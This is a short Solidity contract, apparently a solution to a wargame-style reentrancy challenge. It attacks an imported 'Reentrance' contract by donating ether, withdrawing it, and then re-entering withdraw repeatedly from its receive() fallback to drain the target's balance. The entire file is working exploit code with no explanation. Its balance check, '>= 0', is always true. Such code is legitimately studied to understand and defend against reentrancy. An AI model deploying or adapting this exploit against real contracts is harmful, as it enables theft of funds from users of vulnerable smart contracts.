// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import {Reentrance} from "./Reentrance.sol";

contract ReentranceAttacker {
    Reentrance private reentrance;
    uint256 public amount = 0.001 ether;

    constructor(Reentrance _addr) public {
        reentrance = _addr;
    }

    function attack() public payable {
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }

    receive() external payable {
        if (address(reentrance).balance >= 0) {
            reentrance.withdraw(amount);
        }
    }


}
